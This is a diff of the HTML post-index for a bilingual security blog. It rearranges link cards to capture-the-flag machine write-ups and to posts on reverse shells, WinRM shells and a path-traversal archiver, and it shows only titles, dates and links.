+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/fulcrum_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/fulcrum.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Fulcrum write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Fulcrum</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">09 Jun 2018</time>
+      <time lang="el">09 Ιουν 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
            
           
            
@@ -1564,17 +1344,205 @@ root@Inception:~# cat root.txt
            
            
            
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fast_commit_push/" class="clearfix">
+  <a href="https://alamot.github.io/tally_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/binary_flow.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/dart.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Git &amp; Mercurial: How to commit-push fast and easily</h3>
-      <h3 class="title" lang="el">Git &amp; Mercurial: Πως να κάνετε commit-push γρήγορα και εύκολα</h3>
+      <h3 class="title" lang="en">Tally write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Tally</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">17 Oct 2016</time>
-      <time lang="el">17 Οκτ 2016</time>
+      <time lang="en">03 May 2018</time>
+      <time lang="el">03 Μαϊ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/legacy_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/legacy.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Legacy write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Legacy</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">19 Oct 2017</time>
+      <time lang="el">19 Οκτ 2017</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/minion_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/minions.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Minion write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Minion</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">10 Apr 2018</time>
+      <time lang="el">10 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/fortune_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/fortune.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Fortune write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Fortune</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">02 Aug 2019</time>
+      <time lang="el">02 Αυγ 2019</time>
     </footer>
   </a>
 </article>
@@ -1620,126 +1588,17 @@ root@Inception:~# cat root.txt
            
            
            
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/oracle/" class="clearfix">
+  <a href="https://alamot.github.io/shutdown_manager_plain/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/oracle.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/shutdown_button.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Ask and you shall receive</h3>
-      <h3 class="title" lang="el">Ζήτα και θα λάβεις</h3>
+      <h3 class="title" lang="en">Creation of a shutdown GUI using Gtk in Python</h3>
+      <h3 class="title" lang="el">Δημιουργία μιας γραφικής διεπαφής κλεισίματος με τη χρήση Gtk σε Python</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">04 May 2019</time>
-      <time lang="el">04 Μαϊ 2019</time>
+      <time lang="en">21 Jul 2016</time>
+      <time lang="el">21 Ιουλ 2016</time>
     </footer>
   </a>
 </article>
@@ -1749,83 +1608,21 @@ root@Inception:~# cat root.txt
            
            
            
-           
           
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
            
            
            
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/reverse_shells/" class="clearfix">
+  <a href="https://alamot.github.io/fluxcapacitor_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/shell.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/capacitors.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Reverse shells</h3>
-      <h3 class="title" lang="el">Αντίστροφα κελύφη (reverse shells)</h3>
+      <h3 class="title" lang="en">FluxCapacitor write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του FluxCapacitor</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">12 Apr 2018</time>
-      <time lang="el">12 Απρ 2018</time>
+      <time lang="en">13 May 2018</time>
+      <time lang="el">13 Μαϊ 2018</time>
     </footer>
   </a>
 </article>
@@ -1835,67 +1632,54 @@ root@Inception:~# cat root.txt
            
            
            
-           
           
            
            
            
-           
           
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
            
            
            
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/winrm_shell/" class="clearfix">
+  <a href="https://alamot.github.io/querier_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/winrm.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/querier.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">WinRM shell (a.k.a. PowerShell Remoting) with file upload capability</h3>
-      <h3 class="title" lang="el">WinRM κέλυφος (PowerShell Remoting) με δυνατότητα ανεβάσματος αρχείων</h3>
+      <h3 class="title" lang="en">Querier write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Querier</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">09 Apr 2018</time>
-      <time lang="el">09 Απρ 2018</time>
+      <time lang="en">22 Jun 2019</time>
+      <time lang="el">22 Ιουν 2019</time>
     </footer>
   </a>
 </article>
 
+           
+          
+           
+           
+           
+          
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
            
           
            
@@ -2007,6 +1791,158 @@ root@Inception:~# cat root.txt
   </a>
 </article>
 
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/winrm_shell/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/winrm.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">WinRM shell (a.k.a. PowerShell Remoting) with file upload capability</h3>
+      <h3 class="title" lang="el">WinRM κέλυφος (PowerShell Remoting) με δυνατότητα ανεβάσματος αρχείων</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">09 Apr 2018</time>
+      <time lang="el">09 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/reverse_shells/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/shell.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Reverse shells</h3>
+      <h3 class="title" lang="el">Αντίστροφα κελύφη (reverse shells)</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">12 Apr 2018</time>
+      <time lang="el">12 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
            
           
            
@@ -2159,17 +2095,237 @@ root@Inception:~# cat root.txt
            
            
            
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/path_traversal_archiver/" class="clearfix">
+  <a href="https://alamot.github.io/oracle/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/path.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/oracle.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Path-traversal archiver</h3>
-      <h3 class="title" lang="el">Αρχειοθέτης με διάσχιση διαδρομής</h3>
+      <h3 class="title" lang="en">Ask and you shall receive</h3>
+      <h3 class="title" lang="el">Ζήτα και θα λάβεις</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">14 May 2019</time>
-      <time lang="el">14 Μαϊ 2019</time>
+      <time lang="en">04 May 2019</time>
+      <time lang="el">04 Μαϊ 2019</time>
     </footer>
   </a>
 </article>
@@ -2220,150 +2376,21 @@ root@Inception:~# cat root.txt
            
            
            
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/path_traversal_archiver/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/path.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Path-traversal archiver</h3>
+      <h3 class="title" lang="el">Αρχειοθέτης με διάσχιση διαδρομής</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">14 May 2019</time>
+      <time lang="el">14 Μαϊ 2019</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
